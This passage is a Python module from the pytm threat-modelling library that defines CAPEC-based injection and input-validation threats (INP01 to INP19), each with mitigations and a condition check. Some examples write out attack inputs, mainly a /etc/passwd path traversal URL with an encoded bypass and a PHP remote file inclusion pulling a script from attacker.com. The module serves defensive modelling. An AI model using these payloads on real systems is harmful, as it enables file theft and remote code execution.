"""Input validation and injection threat definitions."""

from __future__ import annotations

import pytm

from pytm.threat import Threat

class INP01(Threat):
    """Buffer Overflow via Environment Variables."""

    id: str = "INP01"
    target: tuple = (pytm.Lambda, pytm.Process)
    description: str = "Buffer Overflow via Environment Variables"
    details: str = (
        "This attack pattern involves causing a buffer overflow through manipulation "
        "of environment variables. Once the attacker finds that they can modify an "
        "environment variable, they may try to overflow associated buffers. This "
        "attack leverages implicit trust often placed in environment variables."
    )
    likelihood: str = "High"
    severity: str = "High"
    prerequisites: str = (
        "The application uses environment variables. "
        "An environment variable exposed to the user is vulnerable to a buffer overflow. "
        "The vulnerable environment variable uses untrusted data. "
        "Tainted data used in the environment variables is not properly validated. "
        "For instance boundary checking is not done before copying the input data to a buffer."
    )
    mitigations: str = (
        "Do not expose environment variable to the user. "
        "Do not use untrusted data in your environment variables. "
        "Use a language or compiler that performs automatic bounds checking. "
        "There are tools such as Sharefuzz which is an environment variable fuzzer for Unix "
        "that support loading a shared library. You can use Sharefuzz to determine if you are "
        "exposing an environment variable vulnerable to buffer overflow."
    )
    example: str = (
        "Attack Example: Buffer Overflow in $HOME "
        "A buffer overflow in sccw allows local users to gain root access via the $HOME "
        "environmental variable. "
        "Attack Example: Buffer Overflow in TERM "
        "A buffer overflow in the rlogin program involves its consumption of the TERM "
        "environmental variable."
    )
    references: str = (
        "https://capec.mitre.org/data/definitions/10.html, CVE-1999-0906, CVE-1999-0046, "
        "http://cwe.mitre.org/data/definitions/120.html, "
        "http://cwe.mitre.org/data/definitions/119.html, "
        "http://cwe.mitre.org/data/definitions/680.html"
    )

    def _check_condition(self, target) -> bool:
        return (
            target.usesEnvironmentVariables is True
            and target.controls.sanitizesInput is False
            and target.controls.checksInputBounds is False
        )

class INP02(Threat):
    """Overflow Buffers."""

    id: str = "INP02"
    target: tuple = (pytm.Process,)
    description: str = "Overflow Buffers"
    details: str = (
        "Buffer Overflow attacks target improper or missing bounds checking on buffer "
        "operations, typically triggered by input injected by an adversary. As a "
        "consequence, an adversary is able to write past the boundaries of allocated "
        "buffer regions in memory, causing a program crash or potentially redirection "
        "of execution as per the adversaries' choice."
    )
    likelihood: str = "High"
    severity: str = "Very high"
    prerequisites: str = (
        "Targeted software performs buffer operations. "
        "Targeted software inadequately performs bounds-checking on buffer operations. "
        "Adversary has the capability to influence the input to buffer operations."
    )
    mitigations: str = (
        "Use a language or compiler that performs automatic bounds checking. "
        "Use secure functions not vulnerable to buffer overflow. "
        "If you have to use dangerous functions, make sure that you do boundary checking. "
        "Compiler-based canary mechanisms such as StackGuard, ProPolice and the "
        "Microsoft Visual Studio /GS flag. "
        "Unless this provides automatic bounds checking, it is not a complete solution. "
        "Use OS-level preventative functionality. Not a complete solution. "
        "Utilize static source code analysis tools to identify potential buffer overflow "
        "weaknesses in the software."
    )
    example: str = (
        "The most straightforward example is an application that reads in input from "
        "the user and stores it in an internal buffer but does not check that the size "
        "of the input data is less than or equal to the size of the buffer. "
        "If the user enters excessive length data, the buffer may overflow leading to "
        "the application crashing, or worse, enabling the user to cause execution of "
        "injected code."
    )
    references: str = (
        "https://capec.mitre.org/data/definitions/100.html, "
        "http://cwe.mitre.org/data/definitions/120.html, "
        "http://cwe.mitre.org/data/definitions/119.html, "
        "http://cwe.mitre.org/data/definitions/680.html"
    )

    def _check_condition(self, target) -> bool:
        return target.controls.checksInputBounds is False

class INP03(Threat):
    """Server Side Include (SSI) Injection."""

    id: str = "INP03"
    target: tuple = (pytm.Server,)
    description: str = "Server Side Include (SSI) Injection"
    details: str = (
        "An attacker can use Server Side Include (SSI) Injection to send code to a web "
        "application that then gets executed by the web server. Doing so enables the "
        "attacker to achieve similar results to Cross Site Scripting, viz., arbitrary "
        "code execution and information disclosure, albeit on a more limited scale, "
        "since the SSI directives are nowhere near as powerful as a full-fledged "
        "scripting language. Nonetheless, the attacker can conveniently gain access to "
        "sensitive files, such as password files, and execute shell commands."
    )
    likelihood: str = "High"
    severity: str = "High"
    prerequisites: str = (
        "A web server that supports server side includes and has them enabled. "
        "User controllable input that can carry include directives to the web server."
    )
    mitigations: str = (
        "Set the OPTIONS IncludesNOEXEC in the global access.conf file or local "
        ".htaccess (Apache) file to deny SSI execution in directories that do not need them. "
        "All user controllable input must be appropriately sanitized before use in the "
        "application. This includes omitting, or encoding, certain characters or strings "
        "that have the potential of being interpreted as part of an SSI directive. "
        "Server Side Includes must be enabled only if there is a strong business reason to do so."
    )
    example: str = (
        "Consider a website hosted on a server that permits Server Side Includes (SSI), "
        "such as Apache with the Options Includes directive enabled. "
        "Whenever an error occurs, the HTTP Headers along with the entire request are "
        "logged, which can then be displayed on a page that allows review of such errors. "
        "A malicious user can inject SSI directives in the HTTP Headers of a request "
        "designed to create an error. When these logs are eventually reviewed, the server "
        "parses the SSI directives and executes them."
    )
    references: str = (
        "https://capec.mitre.org/data/definitions/101.html, "
        "http://cwe.mitre.org/data/definitions/97.html, "
        "http://cwe.mitre.org/data/definitions/74.html, "
        "http://cwe.mitre.org/data/definitions/20.html, "
        "http://cwe.mitre.org/data/definitions/713.html"
    )

    def _check_condition(self, target) -> bool:
        return (
            target.controls.sanitizesInput is False
            or target.controls.encodesOutput is False
        )

class INP04(Threat):
    """HTTP Request Splitting."""

    id: str = "INP04"
    target: tuple = (pytm.Server,)
    description: str = "HTTP Request Splitting"
    details: str = (
        "HTTP Request Splitting (also known as HTTP Request Smuggling) is an attack "
        "pattern where an attacker attempts to insert additional HTTP requests in the "
        "body of the original (enveloping) HTTP request in such a way that the browser "
        "interprets it as one request but the web server interprets it as two."
    )
    likelihood: str = "Medium"
    severity: str = "High"
    prerequisites: str = "User-manipulateable HTTP Request headers are processed by the web server."
    mitigations: str = (
        "Make sure to install the latest vendor security patches available for the web server. "
        "If possible, make use of SSL. "
        "Install a web application firewall that has been secured against HTTP Request Splitting. "
        "Use web servers that employ a tight HTTP parsing process."
    )
    example: str = (
        "Microsoft Internet Explorer versions 5.01 SP4 and prior, 6.0 SP2 and prior, "
        "and 7.0 contain a vulnerability that could allow an unauthenticated, remote "
        "attacker to conduct HTTP request splitting and smuggling attacks."
    )
    references: str = (
        "https://capec.mitre.org/data/definitions/105.html, "
        "http://cwe.mitre.org/data/definitions/436.html, "
        "http://cwe.mitre.org/data/definitions/444.html"
    )

    def _check_condition(self, target) -> bool:
        return (
            target.controls.validatesInput is False
            or target.controls.validatesHeaders is False
        ) and target.protocol == "HTTP"

class INP05(Threat):
    """Command Line Execution through SQL Injection."""

    id: str = 'INP05'
    target: tuple = (pytm.Server,)
    description: str = 'Command Line Execution through SQL Injection'
    details: str = 'An attacker uses standard SQL injection methods to inject data into the command line for execution. This could be done directly through misuse of directives such as MSSQL_xp_cmdshell or indirectly through injection of data into the database that would be interpreted as shell commands. Sometime later, an unscrupulous backend application (or could be part of the functionality of the same application) fetches the injected data stored in the database and uses this data as command line arguments without performing proper validation. The malicious data escapes that data plane by spawning new commands to be executed on the host.'
    likelihood: str = "Low"
    severity: str = "Very high"
    prerequisites: str = 'The application does not properly validate data before storing in the databaseBackend application implicitly trusts the data stored in the databaseMalicious data is used on the backend as a command line argument'
    mitigations: str = 'Disable MSSQL xp_cmdshell directive on the databaseProperly validate the data (syntactically and semantically) before writing it to the database. Do not implicitly trust the data stored in the database. Re-validate it prior to usage to make sure that it is safe to use in a given context (e.g. as a command line argument).'
    example: str = 'SQL injection vulnerability in Cacti 0.8.6i and earlier, when register_argc_argv is enabled, allows remote attackers to execute arbitrary SQL commands via the (1) second or (2) third arguments to cmd.php. NOTE: this issue can be leveraged to execute arbitrary commands since the SQL query results are later used in the polling_items array and popen function'
    references: str = 'https://capec.mitre.org/data/definitions/108.html, http://cwe.mitre.org/data/definitions/89.html, http://cwe.mitre.org/data/definitions/74.html, http://cwe.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/78.html, http://cwe.mitre.org/data/definitions/114.html'

    def _check_condition(self, target) -> bool:
        return target.controls.validatesInput is False

class INP06(Threat):
    """SQL Injection through SOAP Parameter Tampering."""

    id: str = 'INP06'
    target: tuple = (pytm.Server,)
    description: str = 'SQL Injection through SOAP Parameter Tampering'
    details: str = 'An attacker modifies the parameters of the SOAP message that is sent from the service consumer to the service provider to initiate a SQL injection attack. On the service provider side, the SOAP message is parsed and parameters are not properly validated before being used to access a database in a way that does not use parameter binding, thus enabling the attacker to control the structure of the executed SQL query. This pattern describes a SQL injection attack with the delivery mechanism being a SOAP message.'
    likelihood: str = "High"
    severity: str = "Very high"
    prerequisites: str = 'SOAP messages are used as a communication mechanism in the systemSOAP parameters are not properly validated at the service providerThe service provider does not properly utilize parameter binding when building SQL queries'
    mitigations: str = "Properly validate and sanitize/reject user input at the service provider. Ensure that prepared statements or other mechanism that enables parameter binding is used when accessing the database in a way that would prevent the attackers' supplied data from controlling the structure of the executed query. At the database level, ensure that the database user used by the application in a particular context has the minimum needed privileges to the database that are needed to perform the operation. When possible, run queries against pre-generated views rather than the tables directly."
    example: str = "An attacker uses a travel booking system that leverages SOAP communication between the client and the travel booking service. An attacker begins to tamper with the outgoing SOAP messages by modifying their parameters to include characters that would break a dynamically constructed SQL query. He notices that the system fails to respond when these malicious inputs are injected in certain parameters transferred in a SOAP message. The attacker crafts a SQL query that modifies his payment amount in the travel system's database and passes it as one of the parameters . A backend batch payment system later fetches the payment amount from the database (the modified payment amount) and sends to the credit card processor, enabling the attacker to purchase the airfare at a lower price. An attacker needs to have some knowledge of the system's database, perhaps by exploiting another weakness that results in information disclosure."
    references: str = 'https://capec.mitre.org/data/definitions/110.html, http://cwe.mitre.org/data/definitions/89.html, http://cwe.mitre.org/data/definitions/20.html'

    def _check_condition(self, target) -> bool:
        return target.protocol == 'SOAP' and (target.controls.sanitizesInput is False or target.controls.validatesInput is False)

class INP07(Threat):
    """Buffer Manipulation."""

    id: str = 'INP07'
    target: tuple = (pytm.Process,)
    description: str = 'Buffer Manipulation'
    details: str = "An adversary manipulates an application's interaction with a buffer in an attempt to read or modify data they shouldn't have access to. Buffer attacks are distinguished in that it is the buffer space itself that is the target of the attack rather than any code responsible for interpreting the content of the buffer. In virtually all buffer attacks the content that is placed in the buffer is immaterial. Instead, most buffer attacks involve retrieving or providing more input than can be stored in the allocated buffer, resulting in the reading or overwriting of other unintended program memory."
    likelihood: str = "High"
    severity: str = "Very high"
    prerequisites: str = 'The adversary must identify a programmatic means for interacting with a buffer, such as vulnerable C code, and be able to provide input to this interaction.'
    mitigations: str = 'To help protect an application from buffer manipulation attacks, a number of potential mitigations can be leveraged. Before starting the development of the application, consider using a code language (e.g., Java) or compiler that limits the ability of developers to act beyond the bounds of a buffer. If the chosen language is susceptible to buffer related issues (e.g., C) then consider using secure functions instead of those vulnerable to buffer manipulations. If a potentially dangerous function must be used, make sure that proper boundary checking is performed. Additionally, there are often a number of compiler-based mechanisms (e.g., StackGuard, ProPolice and the Microsoft Visual Studio /GS flag) that can help identify and protect against potential buffer issues. Finally, there may be operating system level preventative functionality that can be applied.'
    example: str = 'Attacker identifies programmatic means for interacting with a buffer, such as vulnerable C code, and is able to provide input to this interaction.'
    references: str = 'https://capec.mitre.org/data/definitions/123.html, http://cwe.mitre.org/data/definitions/119.html'

    def _check_condition(self, target) -> bool:
        return target.controls.usesSecureFunctions is False

class INP08(Threat):
    """Format String Injection."""

    id: str = 'INP08'
    target: tuple = (pytm.Lambda, pytm.Process, pytm.Server)
    description: str = 'Format String Injection'
    details: str = 'An adversary includes formatting characters in a string input field on the target application. Most applications assume that users will provide static text and may respond unpredictably to the presence of formatting character. For example, in certain functions of the C programming languages such as printf, the formatting character %s will print the contents of a memory location expecting this location to identify a string and the formatting character %n prints the number of DWORD written in the memory. An adversary can use this to read or write to memory locations or files, or simply to manipulate the value of the resulting text in unexpected ways. Reading or writing memory may result in program crashes and writing memory could result in the execution of arbitrary code if the adversary can write to the program stack.'
    likelihood: str = "High"
    severity: str = "High"
    prerequisites: str = 'The target application must accept a strings as user input, fail to sanitize string formatting characters in the user input, and process this string using functions that interpret string formatting characters.'
    mitigations: str = 'Limit the usage of formatting string functions. Strong input validation - All user-controllable input must be validated and filtered for illegal formatting characters.'
    example: str = 'Untrusted search path vulnerability in the add_filename_to_string function in intl/gettext/loadmsgcat.c for Elinks 0.11.1 allows local users to cause Elinks to use an untrusted gettext message catalog (.po file) in a ../po directory, which can be leveraged to conduct format string attacks.'
    references: str = 'https://capec.mitre.org/data/definitions/135.html, http://cwe.mitre.org/data/definitions/134.html, http://cwe.mitre.org/data/definitions/133.html'

    def _check_condition(self, target) -> bool:
        return target.controls.validatesInput is False or target.controls.sanitizesInput is False

class INP09(Threat):
    """LDAP Injection."""

    id: str = 'INP09'
    target: tuple = (pytm.Server,)
    description: str = 'LDAP Injection'
    details: str = 'An attacker manipulates or crafts an LDAP query for the purpose of undermining the security of the target. Some applications use user input to create LDAP queries that are processed by an LDAP server. For example, a user might provide their username during authentication and the username might be inserted in an LDAP query during the authentication process. An attacker could use this input to inject additional commands into an LDAP query that could disclose sensitive information. For example, entering a * in the aforementioned query might return information about all users on the system. This attack is very similar to an SQL injection attack in that it manipulates a query to gather additional information or coerce a particular return value.'
    likelihood: str = "High"
    severity: str = "High"
    prerequisites: str = 'The target application must accept a string as user input, fail to sanitize characters that have a special meaning in LDAP queries in the user input, and insert the user-supplied string in an LDAP query which is then processed.'
    mitigations: str = 'Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as LDAP content. Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the LDAP or application.'
    example: str = 'PowerDNS before 2.9.18, when running with an LDAP backend, does not properly escape LDAP queries, which allows remote attackers to cause a denial of service (failure to answer ldap questions) and possibly conduct an LDAP injection attack.'
    references: str = 'https://capec.mitre.org/data/definitions/136.html, http://cwe.mitre.org/data/definitions/77.html, http://cwe.mitre.org/data/definitions/90.html, http://cwe.mitre.org/data/definitions/20.html'

    def _check_condition(self, target) -> bool:
        return target.controls.validatesInput is False

class INP10(Threat):
    """Parameter Injection."""

    id: str = 'INP10'
    target: tuple = (pytm.Server,)
    description: str = 'Parameter Injection'
    details: str = 'An adversary manipulates the content of request parameters for the purpose of undermining the security of the target. Some parameter encodings use text characters as separators. For example, parameters in a HTTP GET message are encoded as name-value pairs separated by an ampersand (&). If an attacker can supply text strings that are used to fill in these parameters, then they can inject special characters used in the encoding scheme to add or modify parameters. For example, if user input is fed directly into an HTTP GET request and the user provides the value myInput&new_param=myValue, then the input parameter is set to myInput, but a new parameter (new_param) is also added with a value of myValue. This can significantly change the meaning of the query that is processed by the server. Any encoding scheme where parameters are identified and separated by text characters is potentially vulnerable to this attack - the HTTP GET encoding used above is just one example.'
    likelihood: str = "Medium"
    severity: str = "Medium"
    prerequisites: str = 'The target application must use a parameter encoding where separators and parameter identifiers are expressed in regular text.The target application must accept a string as user input, fail to sanitize characters that have a special meaning in the parameter encoding, and insert the user-supplied string in an encoding which is then processed.'
    mitigations: str = 'Implement an audit log written to a separate host. In the event of a compromise, the audit log may be able to provide evidence and details of the compromise. Treat all user input as untrusted data that must be validated before use.'
    example: str = 'The target application accepts a string as user input, fails to sanitize characters that have a special meaning in the parameter encoding, and inserts the user-supplied string in an encoding which is then processed.'
    references: str = 'https://capec.mitre.org/data/definitions/137.html, http://cwe.mitre.org/data/definitions/88.html'

    def _check_condition(self, target) -> bool:
        return target.controls.validatesInput is False

class INP11(Threat):
    """Relative Path Traversal."""

    id: str = 'INP11'
    target: tuple = (pytm.Server,)
    description: str = 'Relative Path Traversal'
    details: str = "An attacker exploits a weakness in input validation on the target by supplying a specially constructed path utilizing dot and slash characters for the purpose of obtaining access to arbitrary files or resources. An attacker modifies a known path on the target in order to reach material that is not available through intended channels. These attacks normally involve adding additional path separators (/ or ) and/or dots (.), or encodings thereof, in various combinations in order to reach parent directories or entirely separate trees of the target's directory structure."
    likelihood: str = "High"
    severity: str = "High"
    prerequisites: str = 'The target application must accept a string as user input, fail to sanitize combinations of characters in the input that have a special meaning in the context of path navigation, and insert the user-supplied string into path navigation commands.'
    mitigations: str = 'Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement. Implementation: Perform input validation for all remote content, including remote and user-generated content. Implementation: Validate user input by only accepting known good. Ensure all content that is delivered to client is sanitized against an acceptable content specification -- whitelisting approach. Implementation: Prefer working without user input when using file system calls. Implementation: Use indirect references rather than actual file names. Implementation: Use possible permissions on file access when developing and deploying web applications.'
    example: str = "The attacker uses relative path traversal to access files in the application. This is an example of accessing user's password file. http://www.example.com/getProfile.jsp?filename=../../../../etc/passwd However, the target application employs regular expressions to make sure no relative path sequences are being passed through the application to the web page. The application would replace all matches from this regex with the empty string. Then an attacker creates special payloads to bypass this filter: http://www.example.com/getProfile.jsp?filename=%2e%2e/%2e%2e/%2e%2e/%2e%2e /etc/passwd When the application gets this input string, it will be the desired vector by the attacker."
    references: str = 'https://capec.mitre.org/data/definitions/139.html, http://cwe.mitre.org/data/definitions/23.html'

    def _check_condition(self, target) -> bool:
        return target.controls.validatesInput is False or target.controls.sanitizesInput is False

class INP12(Threat):
    """Client-side Injection-induced Buffer Overflow."""

    id: str = 'INP12'
    target: tuple = (pytm.Lambda, pytm.Process)
    description: str = 'Client-side Injection-induced Buffer Overflow'
    details: str = 'This type of attack exploits a buffer overflow vulnerability in targeted client software through injection of malicious content from a custom-built hostile service.'
    likelihood: str = "Medium"
    severity: str = "High"
    prerequisites: str = 'The targeted client software communicates with an external server.The targeted client software has a buffer overflow vulnerability.'
    mitigations: str = 'The client software should not install untrusted code from a non-authenticated server. The client software should have the latest patches and should be audited for vulnerabilities before being used to communicate with potentially hostile servers. Perform input validation for length of buffer inputs. Use a language or compiler that performs automatic bounds checking. Use an abstraction library to abstract away risky APIs. Not a complete solution. Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution. Ensure all buffer uses are consistently bounds-checked. Use OS-level preventative functionality. Not a complete solution.'
    example: str = 'Attack Example: Buffer Overflow in Internet Explorer 4.0 Via EMBED Tag Authors often use EMBED tags in HTML documents. For example <EMBED TYPE=audio/midi SRC=/path/file.mid AUTOSTART=true If an attacker supplies an overly long path in the SRC= directive, the mshtml.dll component will suffer a buffer overflow. This is a standard example of content in a Web page being directed to exploit a faulty module in the system. There are potentially thousands of different ways data can propagate into a given system, thus these kinds of attacks will continue to be found in the wild.'
    references: str = 'https://capec.mitre.org/data/definitions/14.html, http://cwe.mitre.org/data/definitions/74.html, http://cwe.mitre.org/data/definitions/353.html'

    def _check_condition(self, target) -> bool:
        return target.controls.checksInputBounds is False and target.controls.validatesInput is False

class INP13(Threat):
    """Command Delimiters."""

    id: str = 'INP13'
    target: tuple = (pytm.Lambda, pytm.Process)
    description: str = 'Command Delimiters'
    details: str = "An attack of this type exploits a programs' vulnerabilities that allows an attacker's commands to be concatenated onto a legitimate command with the intent of targeting other resources such as the file system or database. The system that uses a filter or a blacklist input validation, as opposed to whitelist validation is vulnerable to an attacker who predicts delimiters (or combinations of delimiters) not present in the filter or blacklist. As with other injection attacks, the attacker uses the command delimiter payload as an entry point to tunnel through the application and activate additional attacks through SQL queries, shell commands, network scanning, and so on."
    likelihood: str = "High"
    severity: str = "High"
    prerequisites: str = "Software's input validation or filtering must not detect and block presence of additional malicious command."
    mitigations: str = 'Design: Perform whitelist validation against a positive specification for command length, type, and parameters.Design: Limit program privileges, so if commands circumvent program input validation or filter routines then commands do not running under a privileged accountImplementation: Perform input validation for all remote content.Implementation: Use type conversions such as JDBC prepared statements.'
    example: str = "By appending special characters, such as a semicolon or other commands that are executed by the target process, the attacker is able to execute a wide variety of malicious commands in the target process space, utilizing the target's inherited permissions, against any resource the host has access to. The possibilities are vast including injection attacks against RDBMS (SQL Injection), directory servers (LDAP Injection), XML documents (XPath and XQuery Injection), and command line shells. In many injection attacks, the results are converted back to strings and displayed to the client process such as a web browser without tripping any security alarms, so the network firewall does not log any out of the ordinary behavior. LDAP servers house critical identity assets such as user, profile, password, and group information that is used to authenticate and authorize users. An attacker that can query the directory at will and execute custom commands against the directory server is literally working with the keys to the kingdom in many enterprises. When user, organizational units, and other directory objects are queried by building the query string directly from user input with no validation, or other conversion, then the attacker has the ability to use any LDAP commands to query, filter, list, and crawl against the LDAP server directly in the same manner as SQL injection gives the ability to the attacker to run SQL commands on the database."
    references: str = 'https://capec.mitre.org/data/definitions/15.html, http://cwe.mitre.org/data/definitions/146.html, http://cwe.mitre.org/data/definitions/77.html, http://cwe.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/154.html'

    def _check_condition(self, target) -> bool:
        return target.controls.validatesInput is False

class INP14(Threat):
    """Input Data Manipulation."""

    id: str = 'INP14'
    target: tuple = (pytm.Process, pytm.Lambda, pytm.Server)
    description: str = 'Input Data Manipulation'
    details: str = "An attacker exploits a weakness in input validation by controlling the format, structure, and composition of data to an input-processing interface. By supplying input of a non-standard or unexpected form an attacker can adversely impact the security of the target. For example, using a different character encoding might cause dangerous text to be treated as safe text. Alternatively, the attacker may use certain flags, such as file extensions, to make a target application believe that provided data should be handled using a certain interpreter when the data is not actually of the appropriate type. This can lead to bypassing protection mechanisms, forcing the target to use specific components for input processing, or otherwise causing the user's data to be handled differently than might otherwise be expected. This attack differs from Variable Manipulation in that Variable Manipulation attempts to subvert the target's processing through the value of the input while Input Data Manipulation seeks to control how the input is processed."
    severity: str = "Medium"
    prerequisites: str = 'The target must accept user data for processing and the manner in which this data is processed must depend on some aspect of the format or flags that the attacker can control.'
    mitigations: str = 'Validation of user input for type, length, data-range, format, etc.'
    example: str = 'A target application has an integer variable for which only some integer values are expected by the application. But since it does not have any checks in place to validate the value of the input, the attacker is able to manipulate the targeted integer variable such that normal operations result in non-standard values.'
    references: str = 'https://capec.mitre.org/data/definitions/153.html, http://cwe.mitre.org/data/definitions/20.html'

    def _check_condition(self, target) -> bool:
        return target.controls.validatesInput is False

class INP15(Threat):
    """IMAP/SMTP Command Injection."""

    id: str = 'INP15'
    target: tuple = (pytm.Server,)
    description: str = 'IMAP/SMTP Command Injection'
    details: str = 'An attacker exploits weaknesses in input validation on IMAP/SMTP servers to execute commands on the server. Web-mail servers often sit between the Internet and the IMAP or SMTP mail server. User requests are received by the web-mail servers which then query the back-end mail server for the requested information and return this response to the user. In an IMAP/SMTP command injection attack, mail-server commands are embedded in parts of the request sent to the web-mail server. If the web-mail server fails to adequately sanitize these requests, these commands are then sent to the back-end mail server when it is queried by the web-mail server, where the commands are then executed. This attack can be especially dangerous since administrators may assume that the back-end server is protected against direct Internet access and therefore may not secure it adequately against the execution of malicious commands.'
    severity: str = "Medium"
    prerequisites: str = 'The target environment must consist of a web-mail server that the attacker can query and a back-end mail server. The back-end mail server need not be directly accessible to the attacker.The web-mail server must fail to adequately sanitize fields received from users and passed on to the back-end mail server.The back-end mail server must not be adequately secured against receiving malicious commands from the web-mail server.'
    mitigations: str = 'All user-controllable input should be validated and filtered for potentially unwanted characters. Whitelisting input is desired, but if a blacklisting approach is necessary, then focusing on command related terms and delimiters is necessary. Input should be encoded prior to use in commands to make sure command related characters are not treated as part of the command. For example, quotation characters may need to be encoded so that the application does not treat the quotation as a delimiter. Input should be parameterized, or restricted to data sections of a command, thus removing the chance that the input will be treated as part of the command itself.'
    example: str = 'An adversary looking to execute a command of their choosing, injects new items into an existing command thus modifying interpretation away from what was intended. Commands in this context are often standalone strings that are interpreted by a downstream component and cause specific responses. This type of attack is possible when untrusted values are used to build these command strings. Weaknesses in input validation or command construction can enable the attack and lead to successful exploitation.'
    references: str = 'https://capec.mitre.org/data/definitions/183.html, http://cwe.mitre.org/data/definitions/77.html'

    def _check_condition(self, target) -> bool:
        return (target.protocol == 'IMAP' or target.protocol == 'SMTP') and target.controls.sanitizesInput is False

class INP16(Threat):
    """PHP Remote File Inclusion."""

    id: str = 'INP16'
    target: tuple = (pytm.Server,)
    description: str = 'PHP Remote File Inclusion'
    details: str = 'In this pattern the adversary is able to load and execute arbitrary code remotely available from the application. This is usually accomplished through an insecurely configured PHP runtime environment and an improperly sanitized include or require call, which the user can then control to point to any web-accessible file. This allows adversaries to hijack the targeted application and force it to execute their own instructions.'
    likelihood: str = "High"
    severity: str = "High"
    prerequisites: str = 'Target application server must allow remote files to be included in the require, include, etc. PHP directivesThe adversary must have the ability to make HTTP requests to the target web application.'
    mitigations: str = 'Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Only allow known files to be included (whitelist)Implementation: Make use of indirect references passed in URL parameters instead of file namesConfiguration: Ensure that remote scripts cannot be include in the include or require PHP directives'
    example: str = "The adversary controls a PHP script on a server http://attacker.com/rfi.txt The .txt extension is given so that the script doesn't get executed by the attacker.com server, and it will be downloaded as text. The target application is vulnerable to PHP remote file inclusion as following: include($_GET['filename'] . '.txt') The adversary creates an HTTP request that passes his own script in the include: http://example.com/file.php?filename=http://attacker.com/rfi with the concatenation of the .txt prefix, the PHP runtime download the attack's script and the content of the script gets executed in the same context as the rest of the original script."
    references: str = 'https://capec.mitre.org/data/definitions/193.html, http://cwe.mitre.org/data/definitions/98.html, http://cwe.mitre.org/data/definitions/80.html, http://cwe.mitre.org/data/definitions/714.html'

    def _check_condition(self, target) -> bool:
        return target.controls.validatesInput is False

class INP17(Threat):
    """XSS Using MIME Type Mismatch."""

    id: str = 'INP17'
    target: tuple = (pytm.Server,)
    description: str = 'XSS Using MIME Type Mismatch'
    details: str = "An adversary creates a file with scripting content but where the specified MIME type of the file is such that scripting is not expected. The adversary tricks the victim into accessing a URL that responds with the script file. Some browsers will detect that the specified MIME type of the file does not match the actual type of its content and will automatically switch to using an interpreter for the real content type. If the browser does not invoke script filters before doing this, the adversary's script may run on the target unsanitized, possibly revealing the victim's cookies or executing arbitrary script in their browser."
    likelihood: str = "Medium"
    severity: str = "Medium"
    prerequisites: str = "The victim must follow a crafted link that references a scripting file that is mis-typed as a non-executable file.The victim's browser must detect the true type of a mis-labeled scripting file and invoke the appropriate script interpreter without first performing filtering on the content."
    mitigations: str = 'Design: Browsers must invoke script filters to detect that the specified MIME type of the file matches the actual type of its content before deciding which script interpreter to use.'
    example: str = "For example, the MIME type text/plain may be used where the actual content is text/javascript or text/html. Since text does not contain scripting instructions, the stated MIME type would indicate that filtering is unnecessary. However, if the target application subsequently determines the file's real type and invokes the appropriate interpreter, scripted content could be invoked.In another example, img tags in HTML content could reference a renderable type file instead of an expected image file. The file extension and MIME type can describe an image file, but the file content can be text/javascript or text/html resulting in script execution. If the browser assumes all references in img tags are images, and therefore do not need to be filtered for scripts, this would bypass content filters."
    references: str = 'http://cwe.mitre.org/data/definitions/79.html, http://cwe.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/646.html'

    def _check_condition(self, target) -> bool:
        return target.controls.validatesContentType is False or target.controls.invokesScriptFilters is False

class INP18(Threat):
    """Fuzzing and observing application log data/errors for application mapping."""

    id: str = 'INP18'
    target: tuple = (pytm.Server,)
    description: str = 'Fuzzing and observing application log data/errors for application mapping'
    details: str = "An attacker sends random, malformed, or otherwise unexpected messages to a target application and observes the application's log or error messages returned. Fuzzing techniques involve sending random or malformed messages to a target and monitoring the target's response. The attacker does not initially know how a target will respond to individual messages but by attempting a large number of message variants they may find a variant that trigger's desired behavior. In this attack, the purpose of the fuzzing is to observe the application's log and error messages, although fuzzing a target can also sometimes cause the target to enter an unstable state, causing a crash. By observing logs and error messages, the attacker can learn details about the configuration of the target application and might be able to cause the target to disclose sensitive information."
    likelihood: str = "High"
    severity: str = "Low"
    prerequisites: str = 'The target application must fail to sanitize incoming messages adequately before processing.'
    mitigations: str = "Design: Construct a 'code book' for error messages. When using a code book, application error messages aren't generated in string or stack trace form, but are catalogued and replaced with a unique (often integer-based) value 'coding' for the error. Such a technique will require helpdesk and hosting personnel to use a 'code book' or similar mapping to decode application errors/logs in order to respond to them normally.Design: wrap application functionality (preferably through the underlying framework) in an output encoding scheme that obscures or cleanses error messages to prevent such attacks. Such a technique is often used in conjunction with the above 'code book' suggestion.Implementation: Obfuscate server fields of HTTP response.Implementation: Hide inner ordering of HTTP response header.Implementation: Customizing HTTP error codes such as 404 or 500.Implementation: Hide HTTP response header software information filed.Implementation: Hide cookie's software information filed.Implementation: Obfuscate database type in Database API's error message."
    example: str = 'The following code generates an error message that leaks the full pathname of the configuration file. $ConfigDir = /home/myprog/config;$uname = GetUserInput(username);ExitError(Bad hacker!) if ($uname !~ /^w+$/);$file = $ConfigDir/$uname.txt;if (! (-e $file)) { ExitError(Error: $file does not exist); }... If this code is running on a server, such as a web application, then the person making the request should not know what the full pathname of the configuration directory is. By submitting a username that does not produce a $file that exists, an attacker could get this pathname. It could then be used to exploit path traversal or symbolic link following problems that may exist elsewhere in the application.'
    references: str = 'https://capec.mitre.org/data/definitions/215.html, http://cwe.mitre.org/data/definitions/209.html, http://cwe.mitre.org/data/definitions/532.html'

    def _check_condition(self, target) -> bool:
        return target.controls.sanitizesInput is False or target.controls.encodesOutput is False

class INP19(Threat):
    """XML External Entities Blowup."""

    id: str = 'INP19'
    target: tuple = (pytm.Server,)
    description: str = 'XML External Entities Blowup'
    details: str = 'This attack takes advantage of the entity replacement property of XML where the value of the replacement is a URI. A well-crafted XML document could have the entity refer to a URI that consumes a large amount of resources to create a denial of service condition. This can cause the system to either freeze, crash, or execute arbitrary code depending on the URI.'
    likelihood: str = "Low"
    severity: str = "Medium"
    prerequisites: str = 'A server that has an implementation that accepts entities containing URI values.'
